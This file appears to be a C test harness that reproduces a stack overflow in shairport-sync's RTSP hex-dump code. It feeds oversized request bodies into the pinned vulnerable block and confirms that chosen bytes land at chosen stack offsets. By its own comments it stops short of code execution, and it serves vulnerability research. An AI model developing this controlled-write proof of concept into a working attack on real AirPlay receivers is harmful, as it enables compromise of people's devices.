// Driver for the VERBATIM pinned upstream block from shairport-sync rtsp.c
// (mikebrady/shairport-sync, fix parent a50f18469143b9dbe599b8333d228a586dc29e67
// affected, fix c1c41c4ec9937eb7d2f8819dadd5bc45f65ab3f4 fixed).
//
// run.sh extracts lines 4206-4221 of the pinned file into gen_block.h with a
// #line directive and this file includes it as-is.  No production statement is
// reimplemented: the vulnerable declaration, clamp, hex-dump loop and trailing
// debug() call are the upstream bytes.  The `victim` array is harness-only stack
// storage placed before the block's obf[] so the overflow can be observed and
// chosen bytes read back at requested offsets.  Rung 4 stays INSTRUMENTED:
// no live daemon, no socket, no return-address control, no execution.
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static const char CHOSEN[] = "INDI2SHELL";
static char hexchosen[3 * sizeof(CHOSEN)];
static char *g_obf;
static char *g_victim;
static long g_delta;
static int g_debug_calls;

#define dl 0
// The block's final debug() hands us the real obf[] pointer after the writes.
#define debug(level, fmt, ...) \
    do { g_debug_calls++; g_obf = (char *)(__VA_ARGS__); } while (0)

struct Req { int contentlength; char *content; char *method; };
static struct Req the_req;
static struct Req *req = &the_req;

static void hexdump_unrecognised(void)
{
    char victim[512];
    memset(victim, 0xa5, sizeof(victim));
    g_victim = victim;
#include "gen_block.h"
    g_delta = (long)((uintptr_t)g_victim - (uintptr_t)g_obf);
}

static void one_run(int body_len, int victim_off, int place_chosen, long expect_delta)
{
    char *body = malloc((size_t)body_len);
    if (!body)
        exit(90);
    memset(body, 'Z', (size_t)body_len);
    if (place_chosen) {
        // obf[2*i] receives the hex of body[i]; victim[v] is at obf[g_delta+v].
        int start = (int)((victim_off + g_delta) / 2);
        if (start < 0 || start + (int)strlen(CHOSEN) > body_len) {
            printf("PLACE_SKIPPED start=%d delta=%ld\n", start, g_delta);
        } else {
            memcpy(body + start, CHOSEN, strlen(CHOSEN));
        }
    }
    req->contentlength = body_len;
    req->content = body;
    g_obf = NULL;
    g_debug_calls = 0;
    hexdump_unrecognised();
    // Snapshot inline BEFORE any further call: the callee frame is dead, and
    // printf's own frame can reuse the stack where victim[] lived.
    char snap[512];
    int first = -1;
    for (int i = 0; i < 512; i++) {
        snap[i] = g_victim[i];
        if (first < 0 && (unsigned char)snap[i] != 0xa5) first = i;
    }
    int found = -1;
    const int hn = (int)(2 * (sizeof(CHOSEN) - 1));
    for (int i = 0; i + hn <= 512; i++) {
        int k = 0;
        for (; k < hn; k++) if (snap[i + k] != hexchosen[k]) break;
        if (k == hn) { found = i; break; }
    }
    long d = g_delta;
    int dbg = g_debug_calls;
    printf("LAYOUT body=%d victim_from_obf=%ld debug_calls=%d obf_written=%d prefix=%02X%02X%02X%02X\n",
           body_len, d, dbg, 2 * (body_len > 4096 ? 4096 : body_len) + 1,
           (unsigned char)snap[0], (unsigned char)snap[1],
           (unsigned char)snap[2], (unsigned char)snap[3]);
    if (place_chosen && expect_delta >= 0 && d != expect_delta)
        printf("DELTA_MISMATCH got=%ld expected=%ld\n", d, expect_delta);
    printf("CAPTURE first_changed=%d chosen_offset=%d chosen_bytes=%s supplied=%s\n",
           first, found, found >= 0 ? hexchosen : "", hexchosen);
    if (victim_off >= 0)
        printf("VICTIM requested_offset=%d chosen_offset=%d supplied=%s\n",
               victim_off, found, hexchosen);
    free(body);
}

int main(int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "capture";
    for (size_t i = 0; i < sizeof(CHOSEN) - 1; i++)
        sprintf(hexchosen + 2 * i, "%02X", (unsigned int)(unsigned char)CHOSEN[i]);
    if (!strcmp(mode, "asan")) {
        one_run(4096, -1, 0, -1);
        return 0;
    }
    // Probe once with an inert body to learn this build's stack offset.
    one_run(4096, -1, 0, -1);
    long delta = g_delta;
    one_run(4096, 0, 1, delta);
    one_run(4096, 64, 1, delta);
    return 0;
}
